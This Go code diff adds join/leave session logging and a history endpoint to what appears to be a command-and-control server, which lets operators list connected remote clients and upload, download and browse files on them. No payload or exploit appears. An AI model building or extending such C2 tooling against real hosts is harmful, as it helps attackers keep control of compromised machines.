@@ -11,6 +11,7 @@ import (
 	"net/http"
 	"os"
 	"path/filepath"
+	"sort"
 	"strings"
 	"sync"
 	"time"
@@ -41,6 +42,10 @@ var responseChan = make(chan responseEvent, 64)
 var pendingResponses = make(map[string]chan responseEvent)
 var pendingMutex sync.Mutex
 
+const defaultSessionLogFile = "c2_sessions.jsonl"
+var sessionLogFile = defaultSessionLogFile
+var sessionLogMutex sync.Mutex
+
 func main() {
 	config := LoadConfig()
 	if err := config.Save(); err != nil {
@@ -63,6 +68,7 @@ func main() {
 	http.HandleFunc("/op/upload", corsOp(handleOpUpload))
 	http.HandleFunc("/op/download", corsOp(handleOpDownload))
 	http.HandleFunc("/op/listdir", corsOp(handleOpListDir))
+	http.HandleFunc("/op/sessions/history", corsOp(handleOpSessionsHistory))
 
 	if f, err := os.OpenFile("c2_audit.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644); err == nil {
 		auditLog = log.New(f, "", log.LstdFlags)
@@ -236,7 +242,11 @@ func handleWebSocket(w http.ResponseWriter, r *http.Request) {
 	clients[sessionID] = client
 	clientsMutex.Unlock()
 
+	addrStr := conn.RemoteAddr().String()
+	appendSessionEvent("joined", sessionID, addrStr)
+
 	defer func() {
+		appendSessionEvent("left", sessionID, "")
 		clientsMutex.Lock()
 		delete(clients, sessionID)
 		clientsMutex.Unlock()
@@ -331,6 +341,28 @@ func checkOpToken(r *http.Request) bool {
 	return r.Header.Get("X-Op-Token") == config.OpToken || r.URL.Query().Get("k") == config.OpToken
 }
 
+func appendSessionEvent(event, id, addr string) {
+	sessionLogMutex.Lock()
+	defer sessionLogMutex.Unlock()
+	f, err := os.OpenFile(sessionLogFile, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
+	if err != nil {
+		log.Printf("session log write error: %v", err)
+		return
+	}
+	defer f.Close()
+	at := time.Now().UTC().Format(time.RFC3339)
+	var line []byte
+	if event == "joined" {
+		line, _ = json.Marshal(map[string]string{"event": "joined", "id": id, "addr": addr, "at": at})
+	} else {
+		line, _ = json.Marshal(map[string]string{"event": "left", "id": id, "at": at})
+	}
+	line = append(line, '\n')
+	if _, err := f.Write(line); err != nil {
+		log.Printf("session log write error: %v", err)
+	}
+}
+
 func handleOpSessions(w http.ResponseWriter, r *http.Request) {
 	if r.Method != http.MethodGet {
 		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
@@ -350,6 +382,82 @@ func handleOpSessions(w http.ResponseWriter, r *http.Request) {
 		list = append(list, sessionInfo{ID: id, Addr: c.Conn.RemoteAddr().String()})
 	}
 	clientsMutex.Unlock()
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(list)
+}
+
+const sessionHistoryLimit = 100
+
+func handleOpSessionsHistory(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodGet {
+		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+	if !checkOpToken(r) {
+		http.Error(w, "unauthorized", http.StatusUnauthorized)
+		return
+	}
+	f, err := os.Open(sessionLogFile)
+	if err != nil {
+		if os.IsNotExist(err) {
+			w.Header().Set("Content-Type", "application/json")
+			json.NewEncoder(w).Encode([]interface{}{})
+			return
+		}
+		http.Error(w, "failed to read session history", http.StatusInternalServerError)
+		return
+	}
+	defer f.Close()
+
+	type logEvent struct {
+		Event string `json:"event"`
+		ID    string `json:"id"`
+		Addr  string `json:"addr"`
+		At    string `json:"at"`
+	}
+	type sessionRecord struct {
+		ID        string `json:"id"`
+		Addr      string `json:"addr"`
+		FirstSeen string `json:"first_seen"`
+		LastSeen  string `json:"last_seen"`
+	}
+	byID := make(map[string]*sessionRecord)
+	scanner := bufio.NewScanner(f)
+	for scanner.Scan() {
+		var e logEvent
+		if json.Unmarshal(scanner.Bytes(), &e) != nil || e.ID == "" {
+			continue
+		}
+		rec, ok := byID[e.ID]
+		if !ok {
+			rec = &sessionRecord{ID: e.ID}
+			byID[e.ID] = rec
+		}
+		if e.Event == "joined" {
+			rec.Addr = e.Addr
+			if rec.FirstSeen == "" {
+				rec.FirstSeen = e.At
+			}
+			rec.LastSeen = e.At
+		} else if e.Event == "left" {
+			rec.LastSeen = e.At
+		}
+	}
+	if err := scanner.Err(); err != nil {
+		http.Error(w, "failed to read session history", http.StatusInternalServerError)
+		return
+	}
+
+	var list []*sessionRecord
+	for _, rec := range byID {
+		list = append(list, rec)
+	}
+	sort.Slice(list, func(i, j int) bool {
+		return list[i].LastSeen > list[j].LastSeen
+	})
+	if len(list) > sessionHistoryLimit {
+		list = list[:sessionHistoryLimit]
+	}
 	w.Header().Set("Content-Type", "application/json")
 	json.NewEncoder(w).Encode(list)
 }
